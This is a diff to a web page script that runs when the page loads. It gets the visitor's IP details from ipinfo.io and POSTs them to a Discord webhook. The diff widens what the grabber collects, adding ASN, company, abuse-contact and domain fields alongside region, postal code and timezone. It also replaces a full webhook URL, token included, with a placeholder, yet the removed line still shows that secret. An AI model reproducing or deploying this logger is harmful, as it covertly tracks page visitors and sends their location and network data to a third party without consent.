@@ -685,7 +685,7 @@
 function monke(json) {
     var request = new XMLHttpRequest();
 
-    request.open("POST", "https://discord.com/api/webhooks/1173713953998782634/9x4s85-ntvKivF_vihZq57MHbrEZJMxzMobAoAdcHSOGMbwMPtwQnDzey722CAZZv5cA");
+    request.open("POST", "YOUR_DISCORD_WEBHOOK_URL");
 
     request.setRequestHeader('Content-type', 'application/json');
 
@@ -701,10 +701,21 @@ function monke(json) {
                          `**Region:** \`${json.region || "N/A"}\`\n` +
                          `**Country:** \`${json.country || "N/A"}\`\n` +
                          `**Postal Code:** \`${json.postal || "N/A"}\`\n` +
-                         `**Organization:** \`${json.org || "N/A"}\`\n` +
                          `**Timezone:** \`${json.timezone || "N/A"}\`\n` +
-                         `**Anycast:** ${json.anycast ? "Yes" : "No"}\n\n` +
-                         `**Readme:** [Missing Auth](https://ipinfo.io/missingauth)`
+                         `**Anycast:** ${json.anycast ? "Yes" : "No"}\n` +
+                         `**ASN:** \`${json.asn && json.asn.asn ? json.asn.asn : "N/A"}\`\n` +
+                         `**ASN Name:** \`${json.asn && json.asn.name ? json.asn.name : "N/A"}\`\n` +
+                         `**ASN Domain:** \`${json.asn && json.asn.domain ? json.asn.domain : "N/A"}\`\n` +
+                         `**ASN Route:** \`${json.asn && json.asn.route ? json.asn.route : "N/A"}\`\n\n` +
+                         `**Company:** \`${json.company && json.company.name ? json.company.name : "N/A"}\`\n` +
+                         `**Company Domain:** \`${json.company && json.company.domain ? json.company.domain : "N/A"}\`\n` +
+                         `**Company Type:** \`${json.company && json.company.type ? json.company.type : "N/A"}\`\n\n` +
+                         `**Abuse Address:** \`${json.abuse && json.abuse.address ? json.abuse.address : "N/A"}\`\n` +
+                         `**Abuse Country:** \`${json.abuse && json.abuse.country ? json.abuse.country : "N/A"}\`\n` +
+                         `**Abuse Email:** \`${json.abuse && json.abuse.email ? json.abuse.email : "N/A"}\`\n` +
+                         `**Abuse Phone:** \`${json.abuse && json.abuse.phone ? json.abuse.phone : "N/A"}\`\n\n` +
+                         `**Domains Total:** \`${json.domains && json.domains.total ? json.domains.total : "N/A"}\`\n` +
+                         `**Domains List:** ${json.domains && json.domains.domains ? json.domains.domains.map(domain => `\n- ${domain}`).join("") : "N/A"}`
         }]
     };
 
@@ -714,5 +725,6 @@ function monke(json) {
         console.error("Error sending request:", error);
     }
 }
+
 </script>
 <script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
